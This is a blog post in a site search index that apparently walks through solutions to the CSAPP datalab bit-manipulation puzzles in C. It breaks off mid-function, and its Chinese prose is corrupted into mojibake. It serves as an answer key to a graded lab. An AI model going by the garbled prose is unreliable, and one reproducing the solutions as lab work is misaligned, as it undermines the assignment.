<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CSAPP-ç¬¬äºŒç« -datalab</title>
    <link href="/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/"/>
    <url>/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/</url>
    
    <content type="html"><![CDATA[<p>å“¦æˆ‘çš„ä¸Šå¸å®éªŒæ€ä¹ˆæ˜¯è‹±æ–‡ç‰ˆçš„ğŸ˜¶â€ğŸŒ«ï¸</p><span id="more"></span><p>ä¸Šå‘¨å°å­¦æœŸä¸€ç›´åšé¡¹ç›®æ²¡å­¦ä¹ ï¼Œæ­£å¥½åšåšå®éªŒå¤ä¹ ä¸€ä¸‹</p><h2 id="int"><a href="#int" class="headerlink" title="int"></a>int</h2><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>é¢˜ç›®è¦æ±‚ï¼šåªä½¿ç”¨ ~ å’Œ &amp; æ¥å®ç° ^ æ“ä½œ</p><blockquote><p>å¤ä¹ ç¯èŠ‚</p><p>~  æŒ‰ä½éï¼ˆæ¯ä½äºŒè¿›åˆ¶å–åï¼‰ï¼Œ&amp; æŒ‰ä½ä¸ï¼ˆå¯¹åº”ä½åŒä¸º1ç»“æœä½æ‰ä¸º1ï¼‰,| æŒ‰ä½æˆ–ï¼ˆåªè¦æœ‰ä¸€ä½æ˜¯1ç»“æœä½å°±æ˜¯1ï¼‰ï¼Œ^ äº¦æˆ–ï¼ˆå¯¹åº”ä½ç›¸åŒä¸º0ï¼Œä¸åŒä¸º1ï¼‰</p></blockquote><p>é¦–å…ˆå¯ä»¥æƒ³åˆ° <code>x^y = x&amp;~y + ~x&amp;y = (x&amp;~y)|(~x&amp;y)</code></p><p>æ¥ä¸‹æ¥æƒ³åŠæ³•æ›¿ä»£ <code>|</code>ï¼Œ<code>x|y=~(~x&amp;~y)</code>ï¼Œæ‰€ä»¥æœ€åçš„ç»“æœæ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">return</span> ~(~(x&amp;~y)&amp;~(~x&amp;y));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>é¢˜ç›®è¦æ±‚ï¼šä½¿ç”¨ ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; æ¥è·å– int çš„æœ€å°å€¼</p><blockquote><p>å¤ä¹ ç¯èŠ‚</p><p>ï¼é€»è¾‘éï¼Œ&lt;&lt; å·¦ç§»ï¼Œ &gt;&gt; å³ç§»</p></blockquote><p>æœ€å°å€¼å…¶å®å°±æ˜¯1åé¢31ä¸ª0ï¼Œä½†æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨è¶…è¿‡ 8bit çš„å¸¸æ•°ã€‚å¯ä»¥ä½¿ç”¨å·¦ç§»è¿ç®—ï¼Œè®©åˆå§‹å¸¸æ•°1å·¦ç§»31ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>é¢˜ç›®è¦æ±‚ï¼šåˆ¤æ–­ x æ˜¯ä¸æ˜¯ int çš„æœ€å¤§å€¼</p><blockquote><p>å¤ä¹ ç¯èŠ‚ï¼š</p><p>! é€»è¾‘éï¼Œå°†éé›¶æ•°å€¼è½¬æ¢ä¸º1ï¼Œè€Œ 0 ä¿æŒä¸å˜</p></blockquote><p>æ ¹æ®ä¸Šé¢˜æˆ‘ä»¬å¾—å‡ºæœ€å°å€¼ï¼Œå–åå°±èƒ½å¾—åˆ°æœ€å¤§å€¼ä¹Ÿå°±æ˜¯ <code>~(1&lt;&lt;32)</code> ã€‚</p><p>å¦‚æœ x å’Œæœ€å¤§å€¼ä¸€æ ·ï¼Œé‚£ä¹ˆæ¯ä¸€ä½éƒ½æ˜¯ä¸€æ ·çš„çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¼‚æˆ–æ“ä½œå¦‚æœä¸¤è¾¹ç›¸ç­‰å°±è¿”å› 0ï¼Œæœ€åé€»è¾‘éå°†0è½¬åŒ–ä¸º1å°±è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !(~(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^x);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>é¢˜ç›®è¦æ±‚ï¼šåˆ¤æ–­æ‰€ç»™å‡ºçš„æ•°å­—å¥‡æ•°ä½æ˜¯å¦éƒ½ä¸º 1 ã€‚</p><p>æ ¹æ®é¢˜ç›®æç¤º0xAAAAAAAAçš„å¥‡æ•°ä½éƒ½æ˜¯1ï¼Œå¶æ•°ä½éƒ½æ˜¯0ï¼Œæˆ‘ä»¬è€ƒè™‘ç›´æ¥ç”¨å®ƒæ¥å’ŒåŸæ¥çš„æ•°å­—è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—å†å’ŒAAAå¼‚æˆ–ã€‚ä½†åˆç”±äºä½æ•°ä¸èƒ½è¶…è¿‡ 8 bitï¼Œéœ€è¦åˆ©ç”¨å·¦ç§»è¿ç®—ï¼Œå·¦ç§»ä»¥åå†å’ŒåŸæ¥çš„å€¼è¿›è¡Œä¸è¿ç®—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>     <span class="hljs-type">int</span> y=(<span class="hljs-number">0xAA</span>&lt;&lt; <span class="hljs-number">8</span>)|<span class="hljs-number">0xAA</span>;<br>     y= y|(y&lt;&lt;<span class="hljs-number">16</span>);<br>     <span class="hljs-keyword">return</span> !((y&amp;x)^y) ;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>é¢˜ç›®è¦æ±‚ï¼šå–ç›®æ ‡æ•°å€¼çš„ç›¸åæ•°</p><p>è´Ÿæ•°å°±æ˜¯æŒ‰ä½å–åä»¥ååŠ ä¸€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>é¢˜ç›®è¦æ±‚ï¼šå¦‚æœ 0x30 &lt;&#x3D; x &lt;&#x3D; 0x39ï¼Œåˆ™è¿”å› 1</p><p>åˆ¤æ–­ç›®æ ‡å€¼å’Œå·²çŸ¥æ•°å€¼çš„å¤§å°åªè¦åšå‡æ³•å°±å¯ä»¥ï¼Œä½†æ˜¯è¿™ä¸ªå¼å­ä¸èƒ½ç”¨ - ï¼Œè€ƒè™‘æŒ‰ç…§ä¸Šé¢˜æ–¹æ³•å–ååç›¸åŠ ï¼Œå†çœ‹ç»“æœå€¼ç¬¦å·ä½çš„æ­£è´Ÿå³å¯ã€‚</p><blockquote><p>æ‹¬å·ä¸€å®šè¦æ‹¬å¯¹ğŸ˜¿</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !((x+(~<span class="hljs-number">0x30</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))&amp;!!((x+(~<span class="hljs-number">0x3a</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>é¢˜ç›®è¦æ±‚ï¼šå®ç° x ? y : z ï¼ˆx ä¸ä¸º 0 è¿”å› y ï¼Œä¸º 0 è¿”å› z ï¼‰</p><p>å¯¹äº x æ˜¯å¦ä¸º0ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¸¤æ¬¡ ! è¿ç®—æ¥å®ç°å³ <code>!!0=0</code> ï¼Œ<code>!!3=1</code> ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œä»»ä½•ä¹¦ä¸æ‰€æœ‰ä½å…¨æ˜¯1çš„å€¼çš„ç»“æœéƒ½æ˜¯å®ƒæœ¬èº«ï¼ŒåŒæ ·ä¸ä½å…¨æ˜¯0çš„æ•°å°±æ˜¯0ã€‚æ ¹æ®æ©ç çš„è§„èŒƒï¼Œæ‰€æœ‰ä½éƒ½æ˜¯ 1 çš„å€¼æ˜¯åè¿›åˆ¶çš„ -1ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹é€»è¾‘ä¸ä¹‹åçš„ç»“æœå–å€’æ•°å°±æ˜¯ <code>(~!!x+1)</code> ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((~!!x+<span class="hljs-number">1</span>)&amp;y)|(~(~!!x+<span class="hljs-number">1</span>)&amp;z);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>é¢˜ç›®è¦æ±‚ï¼šå¦‚æœ x &lt;&#x3D; y åˆ™è¿”å› 1ï¼Œå¦åˆ™è¿”å› 0</p><p>æœ¬æ¥æƒ³çš„æ˜¯åƒå‰é¢çš„é¢˜ä¸€æ ·ç›´æ¥ç›¸å‡å°±è¡Œäº†ï¼Œä½†æ˜¯æƒ³åˆ°å¯èƒ½ä¼šæœ‰æº¢å‡ºçš„é—®é¢˜ã€‚</p><p>è§£å†³æ–¹æ³•æ˜¯å…ˆåˆ¤æ–­ç¬¦å·ä½ï¼Œå¦‚æœä¸¤ä¸ªæ•°ç¬¦å·ç›¸åŒå†åšå·®ï¼Œç¬¦å·ä¸åŒå°±å¯ä»¥ç›´æ¥è¿”å›ç»“æœäº†ã€‚</p><table><thead><tr><th>æ­£è´Ÿ</th><th>sign_x</th><th>sign_y</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td>xæ­£ yè´Ÿ</td><td>0</td><td>1</td><td>0</td></tr><tr><td>yæ­£ xè´Ÿ</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>è§‚å¯Ÿç»“æœå¯ä»¥å‘ç°è¿”å›å€¼å°±ç­‰äº <code>sign_x&amp;(!sign_y)</code> ã€‚</p><p>è¿˜éœ€è¦è€ƒè™‘ä¸¤ä¸ªæ•°ç›¸ç­‰çš„æƒ…å†µï¼Œç›¸ç­‰æ—¶ç¬¦å·ä½ä¸º 0 ã€‚å¯ä»¥è½¬æ¢æ€è·¯ç»•è¿‡è¿™ä¸ªæƒ…å†µï¼Œåœ¨æ•°æ®éƒ½æ˜¯æ•´æ•°æ—¶ <code>x&lt;=y</code> ä¹Ÿå°±æ˜¯ <code>x&lt;y+1</code>ï¼Œæ‰€ä»¥åšå·®çš„è®¡ç®—å¼å°±å˜æˆäº† <code>x+(~y+1)-1</code> ä¹Ÿå°±æ˜¯ <code>x+~y</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-type">int</span> sign_x=x&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> sign_y=y&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> result1=sign_x&amp;(!sign_y); <span class="hljs-comment">//ç¬¦å·ä¸åŒçš„è¿”å›ç»“æœ</span><br>    <span class="hljs-type">int</span> flag=!(sign_x^sign_y);   <span class="hljs-comment">//åˆ¤æ–­ç¬¦å·æ˜¯å¦ç›¸åŒ</span><br>    <span class="hljs-keyword">return</span> result1|flag&amp;((x + ~y) &gt;&gt; <span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>é¢˜ç›®è¦æ±‚ï¼šå®ç°é€»è¾‘éçš„åŠŸèƒ½</p><p>é€»è¾‘éæ— éå°±æ˜¯éœ€è¦æƒ³ä¸€æƒ³ 0 å’Œéé›¶æ•°ä¹‹é—´çš„åŒºåˆ«ã€‚0 çš„æ­£è´Ÿæ•°éƒ½ç›¸ç­‰ï¼Œä½†æ˜¯å…¶ä»–æ•°çš„æ­£è´Ÿä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å°†ç›®æ ‡æ•°æ®å–ç›¸åæ•°åå¼‚æˆ–ï¼Œå†åˆ¤æ–­ç¬¦å·ä½ï¼Œç›¸åŒè¿”å› 0ï¼Œä¸åŒè¿”å› 1 ã€‚</p><p>ç”±äºç¬¦å·ä½ä¸º 1 ï¼Œå³ç§»åçš„ç»“æœä¾¿ä¸º0x11111111, ä»¤å…¶åŠ  1 ï¼Œåˆšå¥½ä¸º 0ï¼ˆè¿™æ˜¯å› ä¸ºåœ¨è¡¥ç è¡¨ç¤ºæ³•ä¸­ï¼Œè´Ÿæ•°çš„ç»å¯¹å€¼å¯ä»¥é€šè¿‡å–ååŠ 1æ¥è·å¾—ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>é¢˜ç›®è¦æ±‚ï¼šè¿”å›è¡¨ç¤º x æ‰€éœ€çš„æœ€å°ä½æ•°</p><p><del>è¿™é“é¢˜å®Œå…¨æ²¡æ€è·¯ï¼Œæ˜¯çœ‹åˆ«çš„å¸ˆå‚…çš„åšå®¢æ‰æ˜ç™½çš„</del></p><p>é¦–å…ˆè®©æ‰€æœ‰çš„æ•°æ®éƒ½å˜æˆæ­£å€¼ï¼Œç„¶ååˆ©ç”¨äºŒåˆ†æ³•æ¥åˆ¤æ–­äºŒåˆ†åçš„æœ€é«˜ä½æ˜¯å¦å…¨æ˜¯0ï¼Œå†åˆ¤æ–­æ˜¯å¦å…¨æ˜¯1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> sign ;<br>    sign = x&gt;&gt;<span class="hljs-number">31</span>;<br>    x = (~x&amp;sign)|(~sign&amp;x);   <span class="hljs-comment">//å…¨éƒ¨æ¢æˆä¸ºæ­£æ•°</span><br>    <br>    <span class="hljs-type">int</span> bit_16 =(!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;    <span class="hljs-comment">//æ£€æµ‹æ˜¯å¦æœ‰1</span><br>    x = x &gt;&gt; bit_16;      <span class="hljs-comment">//å°†å·²ç»æ£€æµ‹è¿‡çš„é«˜16ä½ç§»å‡ºå»ç•™ä¸‹ä½ä½</span><br><span class="hljs-type">int</span> bit_8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>x = x &gt;&gt; bit_8;<br>  <span class="hljs-type">int</span> bit_4 = !!(x &gt;&gt; <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">2</span>;<br>  x = x &gt;&gt; bit_4;<br>  <span class="hljs-type">int</span> bit_2 = !!(x &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">1</span>;<br>  x = x &gt;&gt; bit_2;<br>  <span class="hljs-type">int</span> bit_1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>  x = x &gt;&gt; bit_1;<br>  <span class="hljs-type">int</span> bit_0 = x;<br>  <span class="hljs-keyword">return</span> bit_16+bit_8+bit_4+bit_2+bit_1+bit_0+<span class="hljs-number">1</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>é¢˜ç›®è¦æ±‚ï¼šå°†ä¼ å…¥çš„æ— ç¬¦å·æ•´å‹æ•°è½¬æ¢ä¸ºæµ®ç‚¹æ•° <code>f*2</code> è¿”å›</p><blockquote><p>å¤ä¹ ç¯èŠ‚ï¼š</p><p>æµ®ç‚¹æ•°æœ‰ä¸‰éƒ¨åˆ†ï¼Œç¬¦å· sï¼ˆæœ€é«˜ä½ï¼‰ ï¼Œé˜¶ç  expï¼ˆå…«ä½ï¼‰å’Œ å°¾æ•° fracã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p></blockquote><p>å…ˆåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œå†åˆ†ä¸åŒæ¡ä»¶è¿›è¡Œåˆ¤æ–­</p><ul><li><p>exp&#x3D;&#x3D;0</p><p>æ­¤æ—¶æµ®ç‚¹æ•°çš„å€¼æ˜¯ä¸€ä¸ªæ¥è¿‘äº 0 çš„äºŒè¿›åˆ¶å°æ•°ï¼Œå¯ä»¥é€šè¿‡å°†å°¾æ•°éƒ¨åˆ†å·¦ç§» 1 ä½æ¥å°†å…¶ä¹˜ä»¥ 2ã€‚ç„¶åï¼Œå°†ç¬¦å·ä½é‡æ–°æ·»åŠ å›å»ï¼Œå¾—åˆ°ä¹˜ä»¥ 2 åçš„è§„æ ¼åŒ–æµ®ç‚¹æ•°ã€‚</p></li><li><p>exp&#x3D;&#x3D;255</p><p>æŒ‰é¢˜ç›®è¦æ±‚ç›´æ¥è¿”å› uf</p></li><li><p>å…¶ä»–æƒ…å†µ</p><p>exp æŒ‡æ•°åŠ 1ï¼Œå¯¹å®ƒä¹˜2^1ä¹Ÿå°±æ˜¯ä¹˜2</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsign int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-comment">// åˆ†ç¦»ç¬¦å·ä½</span><br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// åˆ†ç¦»æŒ‡æ•°ä½</span><br>    <span class="hljs-type">int</span> <span 